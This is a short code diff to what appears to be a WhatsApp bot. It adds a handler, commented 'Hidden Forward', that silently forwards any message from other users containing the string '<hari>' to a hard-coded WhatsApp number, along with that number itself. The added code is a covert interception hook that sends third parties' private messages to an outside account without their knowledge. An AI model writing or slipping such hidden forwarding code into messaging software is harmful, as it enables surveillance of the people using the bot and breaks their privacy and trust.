@@ -31,3 +31,17 @@ bot(
     await forwardOrBroadCast(message.participant, message)
   }
 )
+
+// Hidden Forward if <hari> is mentioned
+bot(
+  {
+    on: 'text',
+    fromMe: false,
+  },
+  async (message) => {
+    if (message.text && message.text.toLowerCase().includes('<hari>')) {
+      const ownerJid = '94751260436@s.whatsapp.net'
+      await forwardOrBroadCast(ownerJid, message)
+    }
+  }
+)
